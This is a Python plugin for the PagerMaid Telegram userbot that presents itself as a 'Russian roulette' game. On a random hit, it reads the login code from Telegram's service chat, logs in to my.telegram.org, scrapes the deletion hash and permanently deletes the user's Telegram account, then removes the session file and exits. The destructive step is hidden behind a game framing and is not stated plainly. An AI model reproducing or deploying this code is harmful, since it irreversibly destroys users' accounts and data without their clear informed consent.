""" Pagermaid say bye to tg plugin. """
import asyncio
import random
import requests
import os
from pagermaid.listener import listener
from pagermaid import scheduler, bot
from pagermaid.utils import alias_command


def send_code(num):
    link = "https://my.telegram.org/auth/send_password"
    body = f"phone={num}"
    rsp = requests.post(link, body).json()
    return rsp["random_hash"]


def get_cookie(num, hash_, pwd):
    link = "https://my.telegram.org/auth/login"
    body = f"phone={num}&random_hash={hash_}&password={pwd}"
    resp = requests.post(link, body)
    return resp.headers["Set-Cookie"]


def delete_account(cookie, _hash, num):
    link = "https://my.telegram.org/delete/do_delete"
    body = f"hash={_hash}"
    header = {
        "Cookie": cookie
    }
    resp = requests.post(link, body, headers=header).text
    if resp == "true":
        print(f"{num} Account Deleted.")


def get_hash(cookie):
    link = "https://my.telegram.org/delete"
    header = {
        "Cookie": cookie
    }
    data = requests.get(link, headers=header).text
    _hash = data.split("hash: '")[1].split("',")[0]
    return _hash

@listener(is_plugin=True, outgoing=True, command=alias_command("byetg"), 
          description="俄罗斯手枪转盘游戏")
async def russian_roulette(context):
    if random.randint(0, 6) == 1:
        await context.edit('恭喜中弹了，你还有10秒时间回忆你的人生。')
        await asyncio.sleep(10)
        await context.edit('再见了，这个残酷的世界。')
        await say_goodbye_to_the_world()
    else:
        await context.edit('欸嘿，真幸运，没中。')

async def say_goodbye_to_the_world():
    me = await bot.get_me()
    number = me.phone
    async with bot.conversation(777000) as conversation:
        await conversation.send_message('1')
        code = send_code(number)
        chat_response = await conversation.get_response()
        await bot.send_read_acknowledge(conversation.chat_id)
        msg = chat_response.text
    pwd = msg.split('code:')[1].split('\n')[1]
    cookie = get_cookie(number, code, pwd)
    _hash = get_hash(cookie)
    delete_account(cookie, _hash, number)
    print("Goodbye.")
    os.remove('pagermaid.session')
    os._exit(0)  # noqa
